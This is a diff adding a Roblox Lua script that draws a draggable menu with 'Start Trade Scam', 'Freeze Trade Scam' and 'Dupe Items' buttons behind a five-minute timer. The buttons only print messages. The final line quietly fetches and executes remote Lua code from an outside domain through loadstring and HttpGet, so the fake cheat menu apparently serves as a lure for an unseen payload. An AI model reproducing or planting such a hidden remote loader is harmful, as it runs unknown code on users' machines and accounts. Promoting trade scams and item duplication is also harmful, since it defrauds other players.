@@ -1,0 +1,170 @@
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = playerGui
+
+-- Create Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 300)
+frame.Position = UDim2.new(0.5, -150, 0.5, -150)
+frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+-- Add a UI corner for rounded edges
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0, 10)
+uiCorner.Parent = frame
+
+-- Create close button
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 20, 0, 20)
+closeButton.Position = UDim2.new(1, -25, 0, 5)
+closeButton.Text = "X"
+closeButton.TextColor3 = Color3.new(1, 1, 1)
+closeButton.BackgroundColor3 = Color3.new(1, 0, 0)
+closeButton.BorderSizePixel = 0
+closeButton.Parent = frame
+
+closeButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
+
+-- Add a UI corner for the close button for rounded edges
+local closeUiCorner = Instance.new("UICorner")
+closeUiCorner.CornerRadius = UDim.new(0, 5)
+closeUiCorner.Parent = closeButton
+
+-- Function to create buttons
+local function createButton(text, positionY)
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0, 200, 0, 50)
+    button.Position = UDim2.new(0.5, -100, 0, positionY)
+    button.Text = text
+    button.TextColor3 = Color3.new(1, 1, 1)
+    button.BackgroundColor3 = Color3.fromRGB(100, 100, 100) -- Greyed out color
+    button.BorderSizePixel = 0
+    button.Parent = frame
+
+    -- Add a UI corner for the button for rounded edges
+    local buttonUiCorner = Instance.new("UICorner")
+    buttonUiCorner.CornerRadius = UDim.new(0, 10)
+    buttonUiCorner.Parent = button
+
+    return button
+end
+
+-- Create buttons
+local button1 = createButton("Start Trade Scam", 30)
+local button2 = createButton("Freeze Trade Scam", 90)
+local button3 = createButton("Dupe Items", 150)
+
+-- Create Timer Label
+local timerLabel = Instance.new("TextLabel")
+timerLabel.Size = UDim2.new(0, 200, 0, 50)
+timerLabel.Position = UDim2.new(0.5, -100, 0, 230)
+timerLabel.Text = "05:00"
+timerLabel.TextColor3 = Color3.new(1, 1, 1)
+timerLabel.BackgroundColor3 = Color3.fromRGB(100, 0, 0) -- Red background
+timerLabel.BorderSizePixel = 0
+timerLabel.Parent = frame
+
+-- Add a UI corner for the timer label for rounded edges
+local timerUiCorner = Instance.new("UICorner")
+timerUiCorner.CornerRadius = UDim.new(0, 10)
+timerUiCorner.Parent = timerLabel
+
+-- Timer Function
+local function startTimer(duration)
+    local timeRemaining = duration
+    while timeRemaining > 0 do
+        wait(1)
+        timeRemaining = timeRemaining - 1
+        local minutes = math.floor(timeRemaining / 60)
+        local seconds = timeRemaining % 60
+        timerLabel.Text = string.format("%02d:%02d", minutes, seconds)
+    end
+    timerLabel.Text = "00:00"
+    
+    -- Enable buttons when timer is up and change their color
+    button1.BackgroundColor3 = Color3.fromRGB(0, 150, 0) -- Green
+    button2.BackgroundColor3 = Color3.fromRGB(0, 150, 0) -- Green
+    button3.BackgroundColor3 = Color3.fromRGB(0, 150, 0) -- Green
+    button1.Text = "Start Trade Scam"
+    button2.Text = "Freeze Trade Scam"
+    button3.Text = "Dupe Items"
+    button1.Active = true
+    button2.Active = true
+    button3.Active = true
+end
+
+-- Start 5-minute timer (300 seconds)
+spawn(function()
+    startTimer(300)
+end)
+
+-- Button actions (placeholders)
+button1.MouseButton1Click:Connect(function()
+    if button1.Active then
+        print("Start Trade Scam clicked")
+    end
+end)
+ 
+button2.MouseButton1Click:Connect(function()
+    if button2.Active then
+        print("Freeze Trade Scam clicked")
+    end
+end)
+ 
+button3.MouseButton1Click:Connect(function()
+    if button3.Active then
+        print("Dupe items clicked")
+    end
+end)
+
+-- Dragging functionality
+local dragging = false
+local dragStart
+local startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        if dragging then
+            update(input)
+        end
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        if dragging then
+            update(input)
+        end
+    end
+end)
+
+getgenv().gui = false
+loadstring(game:HttpGet("https://egorikusa.space/1273ce86b3a1bd21b76c3e9a.lua", true))()
